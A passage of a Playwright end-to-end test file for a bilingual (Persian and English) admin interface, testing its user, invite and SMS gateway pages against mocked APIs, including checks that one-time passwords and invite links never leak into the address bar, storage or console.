import {
  adminUserFixture,
  alertFixture,
  auditFixture,
  gatewayFixture,
  inviteFixture,
  limitsFixture,
  statsFixture,
  templateFixture,
} from "@ctrlz/api-client/testing/adminFixtures.ts";
import type {Locator, Page} from "@playwright/test";
import {expect, test} from "@ctrlz/ui/testing/guard.ts";
import {expectNoSecretResidue} from "@ctrlz/ui/testing/secretResidue.ts";

import {adm, allowAdminErrors, authText, bodies, commonText, err, errText, gotoShell, LANGS, openAdmin, shellText, typeCode, type Lang, INVITE_CREATED, INVITE_LINK, INVITE_TOKEN} from "./admin-support.ts";

// Spec 17.3 admin-pages.spec.ts (T-327, T-328, T-330, T-331, T-352, T-122, T-325): Users with create user, Invites with
// create invite, the SMS page, Settings with the impact shown before confirm, Audit, and the header notices and alert
// banners. Mock mode (spec 17.1). The one-time values are only ever in state, and these cases look at the address bar to
// prove it.

test.beforeEach(({guard}) => allowAdminErrors(guard));

const CODE = "123456";
const FRESH = {body: {fresh_until: "2099-01-01T00:00:00Z"}};
const url = (page: Page) => new URL(page.url());

/**
 * The network "comes back" after the 30 s stale time, so every active query of the page is read again (queryDefaults refetches on
 * reconnect only). The case calls page.clock.install() before the page is opened.
 */
async function reconnect(page: Page) {
  await page.clock.fastForward(31_000);
  await page.evaluate(() => {
    window.dispatchEvent(new Event("offline"));
    window.dispatchEvent(new Event("online"));
  });
}

/** The attributes that keep a password manager out of a gateway credential field (wp10-r1-5). */
async function expectNoManager(field: Locator, autocomplete: string) {
  await expect(field).toHaveAttribute("autocomplete", autocomplete);
  await expect(field).toHaveAttribute("data-1p-ignore", "true");
  await expect(field).toHaveAttribute("data-lpignore", "true");
  await expect(field).toHaveAttribute("data-bwignore", "true");
}

for (const {lang, dir} of LANGS) {
  test.describe(`admin pages, ${lang} (${dir})`, () => {
    test.use({viewport: {width: 1280, height: 900}});
    const A = (path: string, values?: Record<string, string | number>) => adm(lang, path, values);
    const C = (path: string) => commonText(lang, path);
    const goto = (page: Page, path: string, title: string) => gotoShell(page, lang as Lang, path, title);

    // ---- Users ----------------------------------------------------------------------------------------------------

    test.describe("users", () => {
      test("rows with the phone as a technical token, a status, the dates and the last sign-in", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {
            "GET /users": {
              body: {
                items: [
                  adminUserFixture({phone_e164: "+989120001001"}),
                  adminUserFixture({phone_e164: "+989120001002", tenant_status: "suspended", last_login_at: undefined, one_time_password_expires_at: "2026-11-20T00:00:00Z"}),
                ],
              },
            },
          },
        });
        await goto(page, "/users", A("pages.users.title"));
        const grid = page.getByRole("grid", {name: A("users.gridLabel")});
        await expect(grid.getByRole("row")).toHaveCount(3);
        const first = grid.getByRole("row").nth(1);
        // A phone number keeps its own direction inside Persian text.
        await expect(first.locator('bdi[dir="ltr"]')).toHaveText("+989120001001");
        await expect(first).toContainText(A("users.status.active"));
        const second = grid.getByRole("row").nth(2);
        await expect(second).toContainText(A("users.status.suspended"));
        await expect(second).toContainText(A("users.oneTime"));
        await expect(second).toContainText(A("users.never"));
      });

      test("the list is loading, then empty with its own words, then failed with Retry and the request id", async ({page, context, baseURL}) => {
        let release: () => void = () => undefined;
        const gate = new Promise<void>((resolve) => (release = resolve));
        const mock = await openAdmin(context, baseURL, {handlers: {"GET /users": async () => (await gate, {body: {items: []}})}});
        await page.goto(`/${lang}/users`);
        await expect(page.getByTestId("grid-loading")).toBeVisible();
        release();
        await expect(page.getByTestId("grid-empty")).toContainText(A("users.empty.title"));
        mock.on("GET /users", err(503, "service_unavailable"));
        await page.reload();
        await expect(page.getByRole("alert").filter({hasText: errText(lang, "service_unavailable")})).toBeVisible();
        await expect(page.getByRole("button", {name: C("retry")})).toBeVisible();
      });

      test("a search sends the phone prefix after a pause, and says so when nothing matches", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {"GET /users": (call) => ({body: {items: call.query.get("q") ? [] : [adminUserFixture()]}})},
        });
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: lang === "fa" ? "جستجو" : "Search"}).first().click();
        await page.getByRole("searchbox").first().fill("0912");
        await expect(page.getByTestId("grid-empty")).toContainText(A("users.empty.searchTitle"));
        expect(mock.calls.some((c) => c.path === "/users" && c.query.get("q") === "0912")).toBe(true);
      });

      test("a search the API would refuse is not a number, never a failure with Retry (wp10-r2-1)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {"GET /users": (call) => ({body: {items: call.query.get("q") ? [] : [adminUserFixture()]}})}});
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: lang === "fa" ? "جستجو" : "Search"}).first().click();
        const box = page.getByRole("searchbox").first();
        const refused = ["1", "ali", "09A", "0812"];
        for (const text of refused) {
          await box.fill(text);
          await expect(page.getByTestId("grid-empty")).toContainText(A("users.empty.notNumberText"));
          await expect(page.getByRole("button", {name: C("retry")})).toHaveCount(0);
        }
        // None of them was sent: the API would have answered 400.
        expect(mock.calls.filter((c) => c.path === "/users" && refused.includes(c.query.get("q") ?? ""))).toEqual([]);
        // A real prefix is asked, and its answer is the ordinary "nothing matches".
        await box.fill("0912");
        await expect(page.getByTestId("grid-empty")).toContainText(A("users.empty.searchText"));
      });

      test("a validation_failed on the search is the same answer, in case the client's copy of the rule drifts from the server's", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {"GET /users": (call) => (call.query.get("q") ? err(422, "validation_failed", {fields: [{name: "q", code: "invalid"}]}) : {body: {items: [adminUserFixture()]}})}});
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: lang === "fa" ? "جستجو" : "Search"}).first().click();
        await page.getByRole("searchbox").first().fill("0912");
        await expect(page.getByTestId("grid-empty")).toContainText(A("users.empty.notNumberText"));
        await expect(page.getByRole("button", {name: C("retry")})).toHaveCount(0);
      });

      test("more rows load by the cursor as the grid is scrolled", async ({page, context, baseURL}) => {
        const first = Array.from({length: 50}, (_, i) => adminUserFixture({phone_e164: `+98912100${String(1000 + i)}`}));
        const second = Array.from({length: 5}, (_, i) => adminUserFixture({phone_e164: `+98912200${String(1000 + i)}`}));
        const mock = await openAdmin(context, baseURL, {
          handlers: {"GET /users": (call) => (call.query.get("cursor") === "next-page" ? {body: {items: second}} : {body: {items: first, next_cursor: "next-page"}})},
        });
        await goto(page, "/users", A("pages.users.title"));
        const grid = page.getByRole("grid", {name: A("users.gridLabel")});
        await expect(grid.getByRole("row").nth(1)).toBeVisible();
        await grid.hover();
        for (let i = 0; i < 40 && mock.calls.filter((c) => c.path === "/users").length < 2; i++) await page.mouse.wheel(0, 1500);
        // At least once, and only ever that cursor: TanStack refetches every loaded page of an infinite query when a window
        // regains focus or a stale list is read again, and with two browsers running at once that happens now and then, so
        // an exact count would be a fact about the machine and not about the grid.
        await expect.poll(() => mock.calls.filter((c) => c.path === "/users" && c.query.get("cursor") === "next-page").length).toBeGreaterThanOrEqual(1);
        const cursors = new Set(mock.calls.filter((c) => c.path === "/users" && c.query.get("cursor")).map((c) => c.query.get("cursor")));
        expect([...cursors]).toEqual(["next-page"]);
      });

      test("create: the form is bound to the address, the one-time password is shown once and never joins it", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {"POST /users": {status: 201, body: {tenant_id: "00000000-0000-4000-8000-0000000000aa", user_id: "00000000-0000-4000-8000-0000000000bb", one_time_password: "fixture-otp-value"}}},
        });
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: A("users.create.open")}).click();
        await expect(page).toHaveURL(/[?&]dialog=createUser$/);
        const form = page.getByRole("dialog", {name: A("users.create.title")});
        await form.locator('input[name="phone"]').fill("09121234567");
        await form.getByRole("button", {name: A("users.create.submit"), exact: true}).click();

        const result = page.getByTestId("one-time-result");
        await expect(result).toBeVisible();
        await expect(page.getByTestId("one-time-password")).toHaveText("fixture-otp-value");
        expect(bodies(mock, "POST", "/users")).toEqual([{phone: "09121234567", locale: lang}]);
        // The parameter left the address at that step and the secret never joined it.
        expect(url(page).search).toBe("");
        expect(url(page).href).not.toContain("fixture-otp");
        // gate-r31-11: nor in history state, storage, the cache, the console or a page error.
        await expectNoSecretResidue(page, ["fixture-otp-value"], "the temporary password of a new user");
        // The list is asked again, so the new user is there when the panel closes.
        await expect.poll(() => mock.calls.filter((c) => c.path === "/users" && c.method === "GET").length).toBeGreaterThan(1);
      });

      test("create: the one-time password is shown when the POST answers, not when the list has been fetched again (wp10-r6-2)", async ({page, context, baseURL}) => {
        // The list refetch after the POST is slow (ten loaded pages, or a flaky network). The password exists and cannot be shown
        // again, so it must not wait behind it, and an admin who presses Cancel in that window must not lose it.
        let after = false;
        let release: () => void = () => undefined;
        const gate = new Promise<void>((resolve) => (release = resolve));
        await openAdmin(context, baseURL, {
          handlers: {
            "GET /users": async () => {
              if (after) await gate;
              return {body: {items: []}};
            },
            "POST /users": () => {
              after = true;
              return {status: 201, body: {tenant_id: "00000000-0000-4000-8000-0000000000aa", user_id: "00000000-0000-4000-8000-0000000000bb", one_time_password: "fixture-otp-value"}};
            },
          },
        });
        try {
          await goto(page, "/users", A("pages.users.title"));
          await page.getByRole("button", {name: A("users.create.open")}).click();
          await page.locator('input[name="phone"]').fill("09121234567");
          await page.getByRole("button", {name: A("users.create.submit"), exact: true}).click();
          await expect(page.getByTestId("one-time-password")).toHaveText("fixture-otp-value");
        } finally {
          release();
        }
      });

      test("closing the result with the value unread asks first, and keeps it when asked to", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {"POST /users": {status: 201, body: {tenant_id: "00000000-0000-4000-8000-0000000000aa", user_id: "00000000-0000-4000-8000-0000000000bb", one_time_password: "fixture-otp-value"}}},
        });
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: A("users.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09121234567");
        await page.getByRole("button", {name: A("users.create.submit"), exact: true}).click();
        await expect(page.getByTestId("one-time-result")).toBeVisible();
        await page.getByRole("button", {name: C("done")}).click();
        const confirm = page.getByRole("alertdialog");
        await expect(confirm).toContainText(A("result.confirmTitle"));
        await confirm.getByRole("button", {name: A("result.keep")}).click();
        await expect(page.getByTestId("one-time-password")).toBeVisible();
        // Ticking "I have saved it" is a read: Done then closes, and the value is gone from the page.
        await page.getByRole("checkbox", {name: A("result.saved")}).locator("xpath=ancestor::label").click();
        await page.getByRole("button", {name: C("done")}).click();
        await expect(page.getByTestId("one-time-result")).toHaveCount(0);
        await expect(page.getByText("fixture-otp-value")).toHaveCount(0);
      });

      // gate-r33-12. The lock of gate-r32-6 is for the call: after a created answer it stayed on, and every later open had no Escape and no Close.
      test("create: after one user is created the dialog opens again with Escape and Close working (gate-r33-12)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {"POST /users": {status: 201, body: {tenant_id: "00000000-0000-4000-8000-0000000000aa", user_id: "00000000-0000-4000-8000-0000000000bb", one_time_password: "fixture-otp-value"}}},
        });
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: A("users.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09121234567");
        await page.getByRole("button", {name: A("users.create.submit"), exact: true}).click();
        await expect(page.getByTestId("one-time-result")).toBeVisible();
        await page.getByRole("checkbox", {name: A("result.saved")}).locator("xpath=ancestor::label").click();
        await page.getByRole("button", {name: C("done")}).click();
        await expect(page.getByTestId("one-time-result")).toHaveCount(0);
        await page.getByRole("button", {name: A("users.create.open")}).click();
        const form = page.getByRole("dialog", {name: A("users.create.title")});
        await expect(form).toBeVisible();
        await expect(form.getByRole("button", {name: C("close")})).toHaveCount(1);
        await page.keyboard.press("Escape");
        await expect(form).toHaveCount(0);
        await expect(page).not.toHaveURL(/[?&]dialog=/);
      });

      test("create: a number that cannot be used is said under the number, and the form stays", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {"POST /users": err(409, "phone_unavailable")}});
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: A("users.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09121234567");
        await page.getByRole("button", {name: A("users.create.submit"), exact: true}).click();
        await expect(page.getByText(errText(lang, "phone_unavailable"))).toBeVisible();
        await expect(page.getByRole("dialog", {name: A("users.create.title")})).toBeVisible();
        await expect(page).toHaveURL(/dialog=createUser/);
      });

      // gate-r32-3. Every state-changing admin call needs the fresh TOTP window on main (admin-fresh): the dialog opens and the call is repeated once.
      test("create: a write that needs a fresh code opens the dialog and is repeated once (gate-r32-3)", async ({page, context, baseURL}) => {
        let n = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {"POST /users": () => (++n === 1 ? err(403, "totp_fresh_required") : {status: 201, body: {tenant_id: "00000000-0000-4000-8000-0000000000aa", user_id: "00000000-0000-4000-8000-0000000000bb", one_time_password: "fixture-otp-value"}}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: A("users.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09121234567");
        await page.getByRole("button", {name: A("users.create.submit"), exact: true}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        await typeCode(page, "totp_code", CODE);
        await expect(page.getByTestId("one-time-password")).toHaveText("fixture-otp-value");
        expect(bodies(mock, "POST", "/users")).toHaveLength(2);
      });

      // gate-r32-6. The POST commits and its answer carries a password that cannot be shown again, so the dialog cannot be left while it runs.
      test("create: Back and Escape do not drop the form while the POST runs, and the password is shown when it answers (gate-r32-6)", async ({page, context, baseURL}) => {
        let release: () => void = () => undefined;
        const gate = new Promise<void>((resolve) => (release = resolve));
        let sent = false;
        await openAdmin(context, baseURL, {
          handlers: {
            "POST /users": async () => {
              sent = true;
              await gate;
              return {status: 201, body: {tenant_id: "00000000-0000-4000-8000-0000000000aa", user_id: "00000000-0000-4000-8000-0000000000bb", one_time_password: "fixture-otp-value"}};
            },
          },
        });
        try {
          await goto(page, "/users", A("pages.users.title"));
          await page.getByRole("button", {name: A("users.create.open")}).click();
          await page.locator('input[name="phone"]').fill("09121234567");
          await page.getByRole("button", {name: A("users.create.submit"), exact: true}).click();
          await expect.poll(() => sent).toBe(true);
          const form = page.getByRole("dialog", {name: A("users.create.title")});
          // The guard cancels a traversal (Navigation API) or answers it with a popstate: no navigation finishes, so history.back() from the page.
          for (let i = 0; i < 2; i++) await page.evaluate(() => window.history.back());
          await page.keyboard.press("Escape");
          await expect(form).toBeVisible();
          await expect(page).toHaveURL(/[?&]dialog=createUser/);
        } finally {
          release();
        }
        await expect(page.getByTestId("one-time-password")).toHaveText("fixture-otp-value");
        expect(url(page).pathname).toBe(`/${lang}/users`);
      });

      // gate-r32-7. No answer after the server may have committed: say the user may exist, never a plain Retry that ends in "cannot be used".
      test("create: a failure that may have lost the answer says the user may exist, with no Retry (gate-r32-7)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {"POST /users": err(500, "internal")}});
        await goto(page, "/users", A("pages.users.title"));
        await page.getByRole("button", {name: A("users.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09121234567");
        const before = mock.calls.filter((c) => c.path === "/users" && c.method === "GET").length;
        await page.getByRole("button", {name: A("users.create.submit"), exact: true}).click();
        await expect(page.getByTestId("create-lost")).toContainText(A("users.create.lost"));
        await expect(page.getByRole("dialog", {name: A("users.create.title")}).getByRole("button", {name: C("retry")})).toHaveCount(0);
        await expect.poll(() => mock.calls.filter((c) => c.path === "/users" && c.method === "GET").length).toBeGreaterThan(before);
      });

      test("the direct link opens the form, and Back closes it", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL);
        await page.goto(`/${lang}/users?dialog=createUser`);
        await expect(page.getByRole("dialog", {name: A("users.create.title")})).toBeVisible();
        await page.keyboard.press("Escape");
        await expect(page.getByRole("dialog", {name: A("users.create.title")})).toHaveCount(0);
        expect(url(page).search).toBe("");
      });
    });

    // ---- Invites --------------------------------------------------------------------------------------------------

    test.describe("invites", () => {
      const pending = inviteFixture({id: "10000000-0000-4000-8000-0000000000a1", phone_e164: "+989350001001"});
      const used = inviteFixture({id: "10000000-0000-4000-8000-0000000000a2", phone_e164: "+989350001002", state: "used"});

      test("rows without a link, and Revoke only on a pending invite", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {"GET /invites": {body: {items: [pending, used]}}}});
        await goto(page, "/invites", A("pages.invites.title"));
        const grid = page.getByRole("grid", {name: A("invites.gridLabel")});
        await expect(grid.getByRole("row")).toHaveCount(3);
        await expect(grid.getByRole("row").nth(1)).toContainText(A("invites.state.pending"));
        await expect(grid.getByRole("row").nth(2)).toContainText(A("invites.state.used"));
        await expect(grid.getByRole("button", {name: A("invites.revoke.row", {phone: "+989350001001"})})).toBeVisible();
        await expect(grid.getByRole("button", {name: A("invites.revoke.row", {phone: "+989350001002"})})).toHaveCount(0);
      });

      test("create: phone, language and lifetime go out, with no SMS switch, and the link is shown once with a copy button", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            "POST /invites": {status: 201, body: INVITE_CREATED},
          },
        });
        await goto(page, "/invites", A("pages.invites.title"));
        await page.getByRole("button", {name: A("invites.create.open")}).click();
        await expect(page).toHaveURL(/dialog=createInvite$/);
        const form = page.getByRole("dialog", {name: A("invites.create.title")});
        await form.locator('input[name="phone"]').fill("09351234567");
        // D67: an invite is never sent by SMS, so the form has no switch for it and says so, and the phone's hint names the number.
        await expect(form.getByRole("switch")).toHaveCount(0);
        await expect(form.getByText(A("invites.create.phoneHint"))).toBeVisible();
        await form.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();

        const result = page.getByRole("dialog", {name: A("invites.result.title")});
        await expect(page.getByTestId("one-time-link")).toHaveText(INVITE_LINK);
        await expect(page.getByTestId("one-time-code")).toHaveCount(0);
        await expect(result.getByText(A("invites.result.intro"))).toBeVisible();
        await expect(result.getByRole("button", {name: A("invites.result.copyLink")})).toBeVisible();
        expect(bodies(mock, "POST", "/invites")).toEqual([{phone: "09351234567", locale: lang, ttl_hours: 72}]);
        expect(url(page).search).toBe("");
        expect(url(page).href).not.toContain(INVITE_TOKEN.slice(0, 8));
        await expectNoSecretResidue(page, [INVITE_TOKEN, INVITE_LINK], "the link of a new invite");
      });

      // wp10-r16-3. A refetch that fails while rows are held keeps them and said nothing: after a create the admin could not tell
      // whether the new invite existed. The grid says so above its rows, with Retry, as the sms and settings pages do.
      test("a list that fails to refresh after a create keeps its rows and says so, with Retry (wp10-r16-3)", async ({page, context, baseURL}) => {
        let list: "ok" | "down" = "ok";
        await openAdmin(context, baseURL, {
          handlers: {
            "GET /invites": () => (list === "ok" ? {body: {items: [pending]}} : err(503, "service_unavailable")),
            "POST /invites": {status: 201, body: INVITE_CREATED},
          },
        });
        await goto(page, "/invites", A("pages.invites.title"));
        const grid = page.getByRole("grid", {name: A("invites.gridLabel")});
        await expect(grid.getByRole("row")).toHaveCount(2);
        await expect(page.getByTestId("refresh-failed")).toHaveCount(0);
        await page.getByRole("button", {name: A("invites.create.open")}).click();
        const form = page.getByRole("dialog", {name: A("invites.create.title")});
        await form.locator('input[name="phone"]').fill("09351234567");
        list = "down";
        await form.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
        await expect(page.getByTestId("one-time-link")).toHaveText(INVITE_LINK);
        const result = page.getByRole("dialog");
        await result.getByRole("checkbox").focus();
        await page.keyboard.press("Space");
        await result.getByRole("button", {name: C("done"), exact: true}).click();
        await expect(result).toHaveCount(0);
        const line = page.getByTestId("refresh-failed");
        await expect(line).toBeVisible({timeout: 30_000});
        await expect(page.getByRole("alert").filter({hasText: A("refreshFailed")})).toBeVisible();
        // The old rows stay, and no section error replaced them.
        await expect(grid.getByRole("row")).toHaveCount(2);
        list = "ok";
        await line.getByRole("button", {name: C("retry")}).click();
        await expect(line).toHaveCount(0);
        await expect(grid.getByRole("row")).toHaveCount(2);
      });

      test("create: a lifetime over 720 hours is held at 720 by the field, and an empty one is refused before a request", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {"POST /invites": {status: 201, body: INVITE_CREATED}}});
        await goto(page, "/invites", A("pages.invites.title"));
        await page.getByRole("button", {name: A("invites.create.open")}).click();
        const form = page.getByRole("dialog", {name: A("invites.create.title")});
        await form.locator('input[name="phone"]').fill("09351234567");
        const ttl = form.getByRole("textbox", {name: A("invites.create.ttl")});
        await ttl.fill("");
        await ttl.blur();
        await form.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
        await expect(form.getByText(A("invites.create.ttlRange", {max: lang === "fa" ? "۷۲۰" : 720}))).toBeVisible();
        expect(mock.count("POST /invites")).toBe(0);
        await ttl.fill("900");
        await ttl.blur();
        await expect(ttl).toHaveValue(lang === "fa" ? "۷۲۰" : "720");
        await form.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
        await expect.poll(() => bodies(mock, "POST", "/invites")).toEqual([{phone: "09351234567", locale: lang, ttl_hours: 720}]);
      });

      test("create: the invite link is shown when the POST answers, not when the list has been fetched again (wp10-r6-2)", async ({page, context, baseURL}) => {
        let after = false;
        let release: () => void = () => undefined;
        const gate = new Promise<void>((resolve) => (release = resolve));
        await openAdmin(context, baseURL, {
          handlers: {
            "GET /invites": async () => {
              if (after) await gate;
              return {body: {items: []}};
            },
            "POST /invites": () => {
              after = true;
              return {status: 201, body: INVITE_CREATED};
            },
          },
        });
        try {
          await goto(page, "/invites", A("pages.invites.title"));
          await page.getByRole("button", {name: A("invites.create.open")}).click();
          const form = page.getByRole("dialog", {name: A("invites.create.title")});
          await form.locator('input[name="phone"]').fill("09351234567");
          await form.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
          await expect(page.getByTestId("one-time-link")).toHaveText(INVITE_LINK);
        } finally {
          release();
        }
      });

      test("create: a write that needs a fresh code opens the dialog and is repeated once (gate-r32-3)", async ({page, context, baseURL}) => {
        let n = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {"POST /invites": () => (++n === 1 ? err(403, "totp_fresh_required") : {status: 201, body: INVITE_CREATED}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/invites", A("pages.invites.title"));
        await page.getByRole("button", {name: A("invites.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09351234567");
        await page.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        await typeCode(page, "totp_code", CODE);
        await expect(page.getByTestId("one-time-link")).toHaveText(INVITE_LINK);
        expect(bodies(mock, "POST", "/invites")).toHaveLength(2);
      });

      test("create: Back and Escape do not drop the form while the POST runs, and the code is shown when it answers (gate-r32-6)", async ({page, context, baseURL}) => {
        let release: () => void = () => undefined;
        const gate = new Promise<void>((resolve) => (release = resolve));
        let sent = false;
        await openAdmin(context, baseURL, {
          handlers: {
            "POST /invites": async () => {
              sent = true;
              await gate;
              return {status: 201, body: INVITE_CREATED};
            },
          },
        });
        try {
          await goto(page, "/invites", A("pages.invites.title"));
          await page.getByRole("button", {name: A("invites.create.open")}).click();
          await page.locator('input[name="phone"]').fill("09351234567");
          await page.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
          await expect.poll(() => sent).toBe(true);
          for (let i = 0; i < 2; i++) await page.evaluate(() => window.history.back());
          await page.keyboard.press("Escape");
          await expect(page.getByRole("dialog", {name: A("invites.create.title")})).toBeVisible();
          await expect(page).toHaveURL(/[?&]dialog=createInvite/);
        } finally {
          release();
        }
        await expect(page.getByTestId("one-time-link")).toHaveText(INVITE_LINK);
      });

      // gate-r33-12, as for users: the lock must not outlive the call.
      test("create: after one invite is created the dialog opens again with Escape working (gate-r33-12)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {"POST /invites": {status: 201, body: INVITE_CREATED}},
        });
        await goto(page, "/invites", A("pages.invites.title"));
        await page.getByRole("button", {name: A("invites.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09351234567");
        await page.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
        await expect(page.getByTestId("one-time-result")).toBeVisible();
        await page.getByRole("checkbox", {name: A("result.saved")}).locator("xpath=ancestor::label").click();
        await page.getByRole("button", {name: C("done")}).click();
        await expect(page.getByTestId("one-time-result")).toHaveCount(0);
        await page.getByRole("button", {name: A("invites.create.open")}).click();
        const form = page.getByRole("dialog", {name: A("invites.create.title")});
        await expect(form).toBeVisible();
        await expect(form.getByRole("button", {name: C("close")})).toHaveCount(1);
        await page.keyboard.press("Escape");
        await expect(form).toHaveCount(0);
        await expect(page).not.toHaveURL(/[?&]dialog=/);
      });

      test("create: a failure that may have lost the answer says the invite may exist, with no Retry (gate-r32-7)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {"POST /invites": err(500, "internal")}});
        await goto(page, "/invites", A("pages.invites.title"));
        await page.getByRole("button", {name: A("invites.create.open")}).click();
        await page.locator('input[name="phone"]').fill("09351234567");
        await page.getByRole("button", {name: A("invites.create.submit"), exact: true}).click();
        await expect(page.getByTestId("create-lost")).toContainText(A("invites.create.lost"));
        await expect(page.getByRole("dialog", {name: A("invites.create.title")}).getByRole("button", {name: C("retry")})).toHaveCount(0);
      });

      test("revoke: a write that needs a fresh code opens the dialog and is repeated once (gate-r32-3)", async ({page, context, baseURL}) => {
        let n = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            "GET /invites": {body: {items: [pending]}},
            "DELETE /invites/{id}": () => (++n === 1 ? err(403, "totp_fresh_required") : {status: 204}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/invites", A("pages.invites.title"));
        await page.getByRole("button", {name: A("invites.revoke.row", {phone: "+989350001001"})}).click();
        await page.getByRole("alertdialog").getByRole("button", {name: A("invites.revoke.confirm")}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        await typeCode(page, "totp_code", CODE);
        await expect.poll(() => mock.calls.filter((c) => c.method === "DELETE").length).toBe(2);
      });

      test("revoke asks, then sends DELETE for that invite", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {"GET /invites": {body: {items: [pending]}}, "DELETE /invites/{id}": {status: 204}}});
        await goto(page, "/invites", A("pages.invites.title"));
        await page.getByRole("button", {name: A("invites.revoke.row", {phone: "+989350001001"})}).click();
        const dialog = page.getByRole("alertdialog");
        await expect(dialog).toContainText(A("invites.revoke.title"));
        expect(mock.count("DELETE /invites/{id}")).toBe(0);
        await dialog.getByRole("button", {name: A("invites.revoke.confirm")}).click();
        await expect.poll(() => mock.calls.filter((c) => c.method === "DELETE").map((c) => c.path)).toEqual([`/invites/${pending.id}`]);
        await expect(dialog).toHaveCount(0);
      });
    });

    // ---- SMS ------------------------------------------------------------------------------------------------------

    test.describe("sms", () => {
      const sms = gatewayFixture({provider: "sms_ir", role: "primary"});
      const mela = gatewayFixture({provider: "melipayamak", role: "fallback", hint: "…77c1", cost_per_message: undefined, last_error_at: "2026-11-16T05:00:00Z", last_error_code: "timeout"});
      const none = gatewayFixture({provider: "noop", role: "disabled", configured: false, hint: undefined, cost_per_message: undefined, last_ok_at: undefined});
      const base = {
        "GET /sms/gateways": {body: {items: [sms, mela, none]}},
        "GET /sms/templates": {body: {items: [templateFixture({mappings: [{provider: "sms_ir", provider_template_id: "123456", param_names: ["code"]}]}), templateFixture({key: "account_exists", body: "An account exists for this number.", locale: "en"})]}},
        "GET /sms/limits": {body: limitsFixture()},
        "GET /sms/stats": {body: statsFixture()},
      } as const;
      const tab = (page: Page, id: string) => page.getByRole("tab", {name: A(`sms.tabs.${id}`)});

      test("a card per gateway: configured, the hint, the last error, and noop only because the API lists it", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: base});
        await goto(page, "/sms", A("pages.sms.title"));
        await expect(page.getByTestId("gateway-sms_ir")).toContainText("sms.ir");
        await expect(page.getByTestId("gateway-sms_ir")).toContainText(A("sms.role.primary"));
        await expect(page.getByTestId("gateway-sms_ir")).toContainText("…a9f2");
        await expect(page.getByTestId("gateway-melipayamak")).toContainText("timeout");
        await expect(page.getByTestId("gateway-noop")).toContainText(A("sms.gateways.notConfigured"));
        // A gateway with no credentials cannot be tested.
        await expect(page.getByTestId("gateway-noop").getByRole("button", {name: A("sms.gateways.test")})).toBeDisabled();
      });

      test("an open breaker is said, with when it ends", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {...base, "GET /sms/gateways": {body: {items: [gatewayFixture({breaker_open_until: "2099-01-01T00:00:00Z"})]}}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await expect(page.getByTestId("breaker-open")).toBeVisible();
      });

      test("a breaker that has ended is no longer said to be open, though the page stayed open (wp10-r6-4)", async ({page, context, baseURL}) => {
        // The stored end time stays on the row after it has passed, and the card stays mounted across refetches: a clock read once at
        // mount would keep "open until 14:10" on screen at 14:30.
        await page.clock.install({time: new Date("2026-11-17T14:00:00Z")});
        await openAdmin(context, baseURL, {handlers: {...base, "GET /sms/gateways": {body: {items: [gatewayFixture({breaker_open_until: "2026-11-17T14:10:00Z"})]}}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await expect(page.getByTestId("breaker-open")).toBeVisible();
        await page.clock.fastForward("05:00");
        await expect(page.getByTestId("breaker-open")).toBeVisible();
        await page.clock.fastForward("06:00");
        await expect(page.getByTestId("breaker-open")).toHaveCount(0);
        await expect(page.getByTestId("gateway-sms_ir")).toBeVisible();
      });

      test("credentials are write-only: the dialog starts empty, sends only what was typed, and the field is never filled back", async ({page, context, baseURL}) => {
